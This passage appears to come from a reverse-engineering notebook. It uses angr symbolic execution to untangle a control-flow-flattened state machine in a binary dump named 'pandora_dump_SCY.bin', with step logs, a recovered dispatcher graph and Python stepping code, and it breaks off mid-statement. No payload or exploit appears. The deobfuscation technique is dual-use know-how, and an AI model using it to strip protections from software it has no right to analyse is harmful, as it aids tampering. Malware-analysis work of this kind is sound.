eax: &lt;BV32 0x7a980236&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a30&gt;] ... Only found a single sucessor: 0x7ff6c4b06a4c eax: &lt;BV32 0x7a980236&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a4c&gt;] ... Only found a single sucessor: 0x7ff6c4b06edc eax: &lt;BV32 0x7a980236&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06edc&gt;] ... . WARNING | 2022-03-31 15:04:33,420 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff60 with 8 unconstrained bytes referenced from 0x7ff6c4b06ef8 (offset 0x6ef8 in pandora_dump_SCY.bin (0x7ff6c4b06ef8)) WARNING | 2022-03-31 15:04:33,489 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff50 with 8 unconstrained bytes referenced from 0x7ff6c4b0694d (offset 0x694d in pandora_dump_SCY.bin (0x7ff6c4b0694d)) WARNING | 2022-03-31 15:04:33,491 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff40 with 8 unconstrained bytes referenced from 0x7ff6c4b06952 (offset 0x6952 in pandora_dump_SCY.bin (0x7ff6c4b06952)) . Only found a single sucessor: 0x7ff6c4b06ef8 eax: &lt;BV32 0x7a980236&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06ef8&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 if 0x1 &lt;= mem_7fffffffffeff60_25_64{UNINITIALIZED} then 0xa22a16af else 0x10bc6c78&gt; 0x7a980236 &lt;SimState @ 0x7ff6c4b06ef8&gt; =&gt; [&#39;0x10bc6c78&#39;, &#39;0xa22a16af&#39;] eax: &lt;BV32 0x10bc6c78&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b068b0 eax: &lt;BV32 0x10bc6c78&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068b0&gt;] ... Only found a single sucessor: 0x7ff6c4b068c7 eax: &lt;BV32 0x10bc6c78&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068c7&gt;] ... Only found a single sucessor: 0x7ff6c4b068e3 eax: &lt;BV32 0x10bc6c78&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068e3&gt;] ... Only found a single sucessor: 0x7ff6c4b068ff eax: &lt;BV32 0x10bc6c78&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068ff&gt;] ... Only found a single sucessor: 0x7ff6c4b0691a eax: &lt;BV32 0x10bc6c78&gt; Stepping: [&lt;SimState @ 0x7ff6c4b0691a&gt;] ... Only found a single sucessor: 0x7ff6c4b0694d eax: &lt;BV32 fake_ret_value_26_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b0694d&gt;] ... . WARNING | 2022-03-31 15:04:33,940 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff34 with 4 unconstrained bytes referenced from 0x7ff6c4b06c61 (offset 0x6c61 in pandora_dump_SCY.bin (0x7ff6c4b06c61)) WARNING | 2022-03-31 15:04:34,025 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff38 with 4 unconstrained bytes referenced from 0x7ff6c4b07045 (offset 0x7045 in pandora_dump_SCY.bin (0x7ff6c4b07045)) . Only found a single sucessor: 0x7ff6c4b06976 eax: &lt;BV32 fake_ret_value_29_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06976&gt;] ... Only found a single sucessor: 0x7ff6c4b06992 eax: &lt;BV32 fake_ret_value_30_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06992&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 0x7a980236&gt; 0x10bc6c78 &lt;SimState @ 0x7ff6c4b06992&gt; =&gt; [&#39;0x7a980236&#39;] eax: &lt;BV32 0xa22a16af&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b06819 eax: &lt;BV32 0xa22a16af&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06819&gt;] ... Only found a single sucessor: 0x7ff6c4b06830 eax: &lt;BV32 0xa22a16af&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06830&gt;] ... Only found a single sucessor: 0x7ff6c4b06847 eax: &lt;BV32 0xa22a16af&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06847&gt;] ... Only found a single sucessor: 0x7ff6c4b06c45 eax: &lt;BV32 0xa22a16af&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06c45&gt;] ... Only found a single sucessor: 0x7ff6c4b06c61 eax: &lt;BV32 0xa22a16af&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06c61&gt;] ... Only found a single sucessor: 0x7ff6c4b06c85 eax: &lt;BV32 fake_ret_value_32_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06c85&gt;] ... Only found a single sucessor: 0x7ff6c4b06ca6 eax: &lt;BV32 fake_ret_value_33_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06ca6&gt;] ... Only found a single sucessor: 0x7ff6c4b06cb9 eax: &lt;BV32 fake_ret_value_34_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06cb9&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 if fake_ret_value_34_64{UNINITIALIZED}[31:0] == 0x0 then 0x7d71a1e3 else 0x3cd69d30&gt; 0xa22a16af &lt;SimState @ 0x7ff6c4b06cb9&gt; =&gt; [&#39;0x3cd69d30&#39;, &#39;0x7d71a1e3&#39;] eax: &lt;BV32 0x3cd69d30&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b068b0 eax: &lt;BV32 0x3cd69d30&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068b0&gt;] ... Only found a single sucessor: 0x7ff6c4b068c7 eax: &lt;BV32 0x3cd69d30&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068c7&gt;] ... Only found a single sucessor: 0x7ff6c4b06b09 eax: &lt;BV32 0x3cd69d30&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06b09&gt;] ... Only found a single sucessor: 0x7ff6c4b07008 eax: &lt;BV32 0x3cd69d30&gt; Stepping: [&lt;SimState @ 0x7ff6c4b07008&gt;] ... Only found a single sucessor: 0x7ff6c4b07024 eax: &lt;BV32 0x3cd69d30&gt; Stepping: [&lt;SimState @ 0x7ff6c4b07024&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 0xc30bae2e&gt; 0x3cd69d30 &lt;SimState @ 0x7ff6c4b07024&gt; =&gt; [&#39;0xc30bae2e&#39;] eax: &lt;BV32 0x7d71a1e3&gt; . WARNING | 2022-03-31 15:04:34,058 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff50 with 8 unconstrained bytes referenced from 0x7ff6c4b06c1c (offset 0x6c1c in pandora_dump_SCY.bin (0x7ff6c4b06c1c)) WARNING | 2022-03-31 15:04:34,096 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff2c with 4 unconstrained bytes referenced from 0x7ff6c4b06a04 (offset 0x6a04 in pandora_dump_SCY.bin (0x7ff6c4b06a04)) WARNING | 2022-03-31 15:04:34,099 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff26 with 2 unconstrained bytes referenced from 0x7ff6c4b06a22 (offset 0x6a22 in pandora_dump_SCY.bin (0x7ff6c4b06a22)) WARNING | 2022-03-31 15:04:34,102 | angr.storage.memory_mixins.default_filler_mixin | Filling register cc_ndep with 8 unconstrained bytes referenced from 0x7ff6c4b06a22 (offset 0x6a22 in pandora_dump_SCY.bin (0x7ff6c4b06a22)) WARNING | 2022-03-31 15:04:34,220 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff3c with 4 unconstrained bytes referenced from 0x7ff6c4b06b3b (offset 0x6b3b in pandora_dump_SCY.bin (0x7ff6c4b06b3b)) . Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b068b0 eax: &lt;BV32 0x7d71a1e3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068b0&gt;] ... Only found a single sucessor: 0x7ff6c4b06a30 eax: &lt;BV32 0x7d71a1e3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a30&gt;] ... Only found a single sucessor: 0x7ff6c4b06bbb eax: &lt;BV32 0x7d71a1e3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06bbb&gt;] ... Only found a single sucessor: 0x7ff6c4b06bd7 eax: &lt;BV32 0x7d71a1e3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06bd7&gt;] ... Only found a single sucessor: 0x7ff6c4b06bf3 eax: &lt;BV32 0x7d71a1e3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06bf3&gt;] ... Only found a single sucessor: 0x7ff6c4b06c0f eax: &lt;BV32 fake_ret_value_36_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06c0f&gt;] ... Only found a single sucessor: 0x7ff6c4b06c40 eax: &lt;BV32 fake_ret_value_38_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06c40&gt;] ... Only found a single sucessor: 0x7ff6c4b06ecc eax: &lt;BV32 fake_ret_value_38_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06ecc&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 0xa2992627&gt; 0x7d71a1e3 &lt;SimState @ 0x7ff6c4b06ecc&gt; =&gt; [&#39;0xa2992627&#39;] eax: &lt;BV32 0xc30bae2e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b06819 eax: &lt;BV32 0xc30bae2e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06819&gt;] ... Only found a single sucessor: 0x7ff6c4b069b0 eax: &lt;BV32 0xc30bae2e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b069b0&gt;] ... Only found a single sucessor: 0x7ff6c4b069cc eax: &lt;BV32 0xc30bae2e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b069cc&gt;] ... Only found a single sucessor: 0x7ff6c4b069e8 eax: &lt;BV32 0xc30bae2e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b069e8&gt;] ... Only found a single sucessor: 0x7ff6c4b06a04 eax: &lt;BV32 0xc30bae2e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a04&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 if 0x5b &lt;= mem_7fffffffffeff26_40_16{UNINITIALIZED} then 0x6c249751 else 0x3b2b8a1e&gt; 0xc30bae2e &lt;SimState @ 0x7ff6c4b06a04&gt; =&gt; [&#39;0x6c249751&#39;, &#39;0x3b2b8a1e&#39;] eax: &lt;BV32 0xa2992627&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b06819 eax: &lt;BV32 0xa2992627&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06819&gt;] ... Only found a single sucessor: 0x7ff6c4b06830 eax: &lt;BV32 0xa2992627&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06830&gt;] ... Only found a single sucessor: 0x7ff6c4b06a99 eax: &lt;BV32 0xa2992627&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a99&gt;] ... Only found a single sucessor: 0x7ff6c4b06ab5 eax: &lt;BV32 0xa2992627&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06ab5&gt;] ... Only found a single sucessor: 0x7ff6c4b06ad1 eax: &lt;BV32 0xa2992627&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06ad1&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 0xecce8ff1&gt; 0xa2992627 &lt;SimState @ 0x7ff6c4b06ad1&gt; =&gt; [&#39;0xecce8ff1&#39;] eax: &lt;BV32 0x6c249751&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b068b0 eax: &lt;BV32 0x6c249751&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068b0&gt;] ... Only found a single sucessor: 0x7ff6c4b06a30 eax: &lt;BV32 0x6c249751&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a30&gt;] ... Only found a single sucessor: 0x7ff6c4b06a4c eax: &lt;BV32 0x6c249751&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a4c&gt;] ... Only found a single sucessor: 0x7ff6c4b06a68 eax: &lt;BV32 0x6c249751&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a68&gt;] ... Only found a single sucessor: 0x7ff6c4b06a84 eax: &lt;BV32 0x6c249751&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a84&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 0x7d71a1e3&gt; 0x6c249751 &lt;SimState @ 0x7ff6c4b06a84&gt; =&gt; [&#39;0x7d71a1e3&#39;] eax: &lt;BV32 0x3b2b8a1e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b068b0 eax: &lt;BV32 0x3b2b8a1e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068b0&gt;] ... Only found a single sucessor: 0x7ff6c4b068c7 eax: &lt;BV32 0x3b2b8a1e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068c7&gt;] ... Only found a single sucessor: 0x7ff6c4b06b09 eax: &lt;BV32 0x3b2b8a1e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06b09&gt;] ... Only found a single sucessor: 0x7ff6c4b06b20 eax: &lt;BV32 0x3b2b8a1e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06b20&gt;] ... Only found a single sucessor: 0x7ff6c4b06b3b eax: &lt;BV32 0x3b2b8a1e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06b3b&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 if mem_7fffffffffeff3c_42_32{UNINITIALIZED}[0:0] == 0 then 0xd43fb344 else 0xc094d6c9&gt; . WARNING | 2022-03-31 15:04:34,280 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff78 with 8 unconstrained bytes referenced from 0x7ff6c4b0706e (offset 0x706e in pandora_dump_SCY.bin (0x7ff6c4b0706e)) WARNING | 2022-03-31 15:04:34,325 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff26 with 2 unconstrained bytes referenced from 0x7ff6c4b06b9f (offset 0x6b9f in pandora_dump_SCY.bin (0x7ff6c4b06b9f)) . 0x3b2b8a1e &lt;SimState @ 0x7ff6c4b06b3b&gt; =&gt; [&#39;0xd43fb344&#39;, &#39;0xc094d6c9&#39;] eax: &lt;BV32 0xecce8ff1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b06819 eax: &lt;BV32 0xecce8ff1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06819&gt;] ... Only found a single sucessor: 0x7ff6c4b069b0 eax: &lt;BV32 0xecce8ff1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b069b0&gt;] ... Only found a single sucessor: 0x7ff6c4b06b63 eax: &lt;BV32 0xecce8ff1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06b63&gt;] ... Only found a single sucessor: 0x7ff6c4b07052 eax: &lt;BV32 0xecce8ff1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b07052&gt;] ... Only found a single sucessor: 0x7ff6c4b0706e eax: &lt;BV32 0xecce8ff1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b0706e&gt;] ... Only found a single sucessor: 0x7ff6c4b07090 eax: &lt;BV32 fake_ret_value_44_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b07090&gt;] ... Only found a single sucessor: 0x7ff6c4b070ae eax: &lt;BV32 fake_ret_value_45_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b070ae&gt;] ... Only found a single sucessor: 0xffed89901000 eax: &lt;BV32 0x0&gt; Stepping: [&lt;SimState @ 0xffed89901000&gt;] ... 0xecce8ff1 &lt;SimState @ 0xffed89901000&gt; =&gt; [] eax: &lt;BV32 0xd43fb344&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b06819 eax: &lt;BV32 0xd43fb344&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06819&gt;] ... Only found a single sucessor: 0x7ff6c4b069b0 eax: &lt;BV32 0xd43fb344&gt; Stepping: [&lt;SimState @ 0x7ff6c4b069b0&gt;] ... Only found a single sucessor: 0x7ff6c4b06b63 eax: &lt;BV32 0xd43fb344&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06b63&gt;] ... Only found a single sucessor: 0x7ff6c4b06b7f eax: &lt;BV32 0xd43fb344&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06b7f&gt;] ... Only found a single sucessor: 0x7ff6c4b06b9b eax: &lt;BV32 0xd43fb344&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06b9b&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 0xc30bae2e&gt; 0xd43fb344 &lt;SimState @ 0x7ff6c4b06b9b&gt; =&gt; [&#39;0xc30bae2e&#39;] eax: &lt;BV32 0xc094d6c9&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b06819 eax: &lt;BV32 0xc094d6c9&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06819&gt;] ... Only found a single sucessor: 0x7ff6c4b06830 eax: &lt;BV32 0xc094d6c9&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06830&gt;] ... Only found a single sucessor: 0x7ff6c4b06a99 eax: &lt;BV32 0xc094d6c9&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a99&gt;] ... Only found a single sucessor: 0x7ff6c4b06f3d eax: &lt;BV32 0xc094d6c9&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06f3d&gt;] ... Only found a single sucessor: 0x7ff6c4b06f58 eax: &lt;BV32 0xc094d6c9&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06f58&gt;] ... Only found a single sucessor: 0x7ff6c4b06f70 eax: &lt;BV32 fake_ret_value_47_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06f70&gt;] ... . WARNING | 2022-03-31 15:04:34,651 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff58 with 8 unconstrained bytes referenced from 0x7ff6c4b06f7e (offset 0x6f7e in pandora_dump_SCY.bin (0x7ff6c4b06f7e)) . Only found a single sucessor: 0x7ff6c4b06f9f eax: &lt;BV32 fake_ret_value_49_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06f9f&gt;] ... Only found a single sucessor: 0x7ff6c4b06fc9 eax: &lt;BV32 fake_ret_value_50_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06fc9&gt;] ... Only found a single sucessor: 0x7ff6c4b06ff8 eax: &lt;BV32 fake_ret_value_51_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06ff8&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 0xd43fb344&gt; 0xc094d6c9 &lt;SimState @ 0x7ff6c4b06ff8&gt; =&gt; [&#39;0xd43fb344&#39;] digraph CFG { &#34;0x8cbc0434&#34; -&gt; &#34;0x7d9d86f3&#34; &#34;0x8cbc0434&#34; -&gt; &#34;0x173ba5e1&#34; &#34;0x173ba5e1&#34; -&gt; &#34;0x7a980236&#34; &#34;0x7a980236&#34; -&gt; &#34;0x10bc6c78&#34; &#34;0x7a980236&#34; -&gt; &#34;0xa22a16af&#34; &#34;0x10bc6c78&#34; -&gt; &#34;0x7a980236&#34; &#34;0xa22a16af&#34; -&gt; &#34;0x3cd69d30&#34; &#34;0xa22a16af&#34; -&gt; &#34;0x7d71a1e3&#34; &#34;0x3cd69d30&#34; -&gt; &#34;0xc30bae2e&#34; &#34;0x7d71a1e3&#34; -&gt; &#34;0xa2992627&#34; &#34;0xc30bae2e&#34; -&gt; &#34;0x6c249751&#34; &#34;0xc30bae2e&#34; -&gt; &#34;0x3b2b8a1e&#34; &#34;0xa2992627&#34; -&gt; &#34;0xecce8ff1&#34; &#34;0x6c249751&#34; -&gt; &#34;0x7d71a1e3&#34; &#34;0x3b2b8a1e&#34; -&gt; &#34;0xd43fb344&#34; &#34;0x3b2b8a1e&#34; -&gt; &#34;0xc094d6c9&#34; &#34;0xd43fb344&#34; -&gt; &#34;0xc30bae2e&#34; &#34;0xc094d6c9&#34; -&gt; &#34;0xd43fb344&#34; } . Display graph . https://dreampuf.github.io/GraphvizOnline/ . CFF State Machine Analysis . import angr import claripy import struct BINARY_PATH = &#39;/tmp/pandora_dump_SCY.bin&#39; entry_point = 0x00007FF6C4B066F0 dispatcher_start = 0x00007FF6C4B067F0 project = angr.Project(BINARY_PATH, load_options={&#39;auto_load_libs&#39;: False}) # TODO: We should explicately add the state since we know it (main) initial_state = project.factory.call_state(addr=entry_point) # Use this setting to skip calls instead of a hook initial_state.options.add(angr.options.CALLLESS) simgr = project.factory.simgr(initial_state) simgr.active . WARNING | 2022-03-31 15:04:34,837 | angr.calling_conventions | Guessing call prototype. Please specify prototype. . [&lt;SimState @ 0x7ff6c4b066f0&gt;] . simgr.run(until=lambda s: s.active[0].addr == dispatcher_start) print(simgr.active) initial_dispatcher_state = simgr.active[0] eax_initial = initial_dispatcher_state.solver.eval_one(initial_dispatcher_state.regs.eax) print(f&quot;Initial state address {initial_dispatcher_state}&quot;) print(f&quot;Initial eax: {hex(eax_initial)}&quot;) # Save the initial state at the dispatcher initial_dispatcher_state = simgr.active[0] . WARNING | 2022-03-31 15:04:34,859 | angr.storage.memory_mixins.default_filler_mixin | Filling register r15 with 8 unconstrained bytes referenced from 0x7ff6c4b066f0 (offset 0x66f0 in pandora_dump_SCY.bin (0x7ff6c4b066f0)) WARNING | 2022-03-31 15:04:34,861 | angr.storage.memory_mixins.default_filler_mixin | Filling register r14 with 8 unconstrained bytes referenced from 0x7ff6c4b066f2 (offset 0x66f2 in pandora_dump_SCY.bin (0x7ff6c4b066f2)) WARNING | 2022-03-31 15:04:34,863 | angr.storage.memory_mixins.default_filler_mixin | Filling register r13 with 8 unconstrained bytes referenced from 0x7ff6c4b066f4 (offset 0x66f4 in pandora_dump_SCY.bin (0x7ff6c4b066f4)) WARNING | 2022-03-31 15:04:34,865 | angr.storage.memory_mixins.default_filler_mixin | Filling register r12 with 8 unconstrained bytes referenced from 0x7ff6c4b066f6 (offset 0x66f6 in pandora_dump_SCY.bin (0x7ff6c4b066f6)) WARNING | 2022-03-31 15:04:34,866 | angr.storage.memory_mixins.default_filler_mixin | Filling register rsi with 8 unconstrained bytes referenced from 0x7ff6c4b066f8 (offset 0x66f8 in pandora_dump_SCY.bin (0x7ff6c4b066f8)) WARNING | 2022-03-31 15:04:34,868 | angr.storage.memory_mixins.default_filler_mixin | Filling register rdi with 8 unconstrained bytes referenced from 0x7ff6c4b066f9 (offset 0x66f9 in pandora_dump_SCY.bin (0x7ff6c4b066f9)) WARNING | 2022-03-31 15:04:34,870 | angr.storage.memory_mixins.default_filler_mixin | Filling register rbp with 8 unconstrained bytes referenced from 0x7ff6c4b066fa (offset 0x66fa in pandora_dump_SCY.bin (0x7ff6c4b066fa)) WARNING | 2022-03-31 15:04:34,871 | angr.storage.memory_mixins.default_filler_mixin | Filling register rbx with 8 unconstrained bytes referenced from 0x7ff6c4b066fb (offset 0x66fb in pandora_dump_SCY.bin (0x7ff6c4b066fb)) . [&lt;SimState @ 0x7ff6c4b067f0&gt;] Initial state address &lt;SimState @ 0x7ff6c4b067f0&gt; Initial eax: 0x8cbc0434 . class Flags: def __init__(self, register): self.CF = False self.PF = False self.AF = False self.ZF = False self.SF = False self.TF = False self.IF = False self.DF = False self.OF = False if register &amp; 0x0001 == 0x0001: self.CF = True if register &amp; 0x0004 == 0x0004: self.PF = True if register &amp; 0x0010 == 0x0010: self.AF = True if register &amp; 0x0040 == 0x0040: self.ZF = True if register &amp; 0x0080 == 0x0080: self.SF = True if register &amp; 0x0100 == 0x0100: self.TF = True if register &amp; 0x0200 == 0x0200: self.IF = True if register &amp; 0x0400 == 0x0400: self.DF = True if register &amp; 0x0800 == 0x0800: self.OF = True . state = initial_dispatcher_state.copy() # Original code bb addresses orig_code_bb = [0x7ff6c4b0687f, 0x7ff6c4b0691a, 0x7ff6c4b06a04, 0x7ff6c4b06a84, 0x7ff6c4b06ad1, 0x7ff6c4b06b3b, 0x7ff6c4b06b9b, 0x7ff6c4b06bf3, 0x7ff6c4b06c61, 0x7ff6c4b06cfd, 0x7ff6c4b06e9f, 0x7ff6c4b06ef8, 0x7ff6c4b06f58, 0x7ff6c4b07024] ret_bb = 0x7FF6C4B0706E orig_code_bb.append(ret_bb) # Set symbol for state register eax (32 bit) # eax_state = claripy.BVS(&#39;eax_state&#39;, 4*8) # state.memory.store(state.regs.eax, eax_state) end_bb = 0x7FF6C4B0706E orig_bb_1_start = 0x00007FF6C4B0691A detatched_bb = 0x00007FF6C4B070D1 interrupt_bb = 0x00007FF6C4B070EA # Run from initial state until we hit an original code block simgr_dispatcher = project.factory.simgr(state) while True: simgr_dispatcher.step() print(simgr_dispatcher) if len(simgr_dispatcher.active) != 1: print(f&quot;Multiple states!&quot;) break if simgr_dispatcher.active[0].addr in orig_code_bb: print(f&quot;Found original code block&quot;) break print(f&quot;Step: {hex(simgr_dispatcher.active[0].addr)}&quot;) print(simgr_dispatcher) state_1_end = simgr_dispatcher.active[0] state_1_eax = eax_initial state_1_bb = state_1_end.addr print(f&quot;state_1_eax:{hex(state_1_eax)} -&gt; bb: {hex(state_1_bb)}&quot;) # Run until dispatcher to get new state(s) while True: simgr_dispatcher.step() print(simgr_dispatcher) if len(simgr_dispatcher.active) != 1: print(f&quot;Multiple states!&quot;) break if simgr_dispatcher.active[0].addr == dispatcher_start: print(f&quot;Found dispatcher&quot;) break print(f&quot;Step: {hex(simgr_dispatcher.active[0].addr)}&quot;) # This is the start of state 2 state_2 = simgr_dispatcher.active[0] # Retrieve all potential eax values state_2_eax_values = state_2.solver.eval_upto(state_2.regs.eax, 8) print(f&quot;Number of possible state values: {len(state_2_eax_values)}&quot;) # If there is more than one next state that means our code block will require a conditional jmp to replace # the state machine, we will need to find end process both next states as well as determine what conditions # cause each state for state_2_eax_value in state_2_eax_values: print(f&quot;state_2_eax:{hex(state_2_eax_value)}&quot;) # For each eax state we are going to need the associated flags to eventually replace the conditional # cmov with a conditional jmp flags_values = state_2.solver.eval_upto(state_2.regs.flags, 2, extra_constraints=[state_2.regs.eax == state_2_eax_value]) if len(flags_values) == 1: # This is the constrained state we must save these flags with the state print(f&quot;Constrained state: {hex(state_2_eax_value)}&quot;) flags = flags_values[0] print(f&quot;flags:{hex(flags)}&quot;) f = Flags(flags) print(f&quot;CF: {f.CF}&quot;) print(f&quot;PF: {f.PF}&quot;) print(f&quot;AF: {f.AF}&quot;) print(f&quot;ZF: {f.ZF}&quot;) print(f&quot;SF: {f.SF}&quot;) print(f&quot;TF: {f.TF}&quot;) print(f&quot;IF: {f.IF}&quot;) print(f&quot;DF: {f.DF}&quot;) print(f&quot;OF: {f.OF}&quot;) else: # This is the unconstrained state, we don&#39;t need to save anything print(f&quot;Unconstrained state: {hex(state_2_eax_value)}&quot;) . &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b06819 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b06830 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b06847 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b06863 &lt;SimulationManager with 1 active&gt; Found original code block &lt;SimulationManager with 1 active&gt; state_1_eax:0x8cbc0434 -&gt; bb: 0x7ff6c4b0687f . WARNING | 2022-03-31 15:04:35,337 | angr.storage.memory_mixins.default_filler_mixin | Filling register cc_ndep with 8 unconstrained bytes referenced from 0x7ff6c4b067f0 (offset 0x67f0 in pandora_dump_SCY.bin (0x7ff6c4b067f0)) . &lt;SimulationManager with 1 active&gt; Found dispatcher Number of possible state values: 2 state_2_eax:0x7d9d86f3 Unconstrained state: 0x7d9d86f3 state_2_eax:0x173ba5e1 Constrained state: 0x173ba5e1 flags:0x44 CF: False PF: True AF: False ZF: True SF: False TF: False IF: False DF: False OF: False . # and process both eax states seperately to link each one with their basic block state_2_1 = state_2.copy() state_2_1_eax = state_2_eax_values[0] # Set eax back to a concrete value choosing state_2_1 state_2_1.regs.eax = state.solver.BVV(state_2_1_eax, 32) state_2_2 = state_2.copy() state_2_2_eax = state_2_eax_values[1] # Set eax back to a concrete value choosing state_2_2 state_2_2.regs.eax = 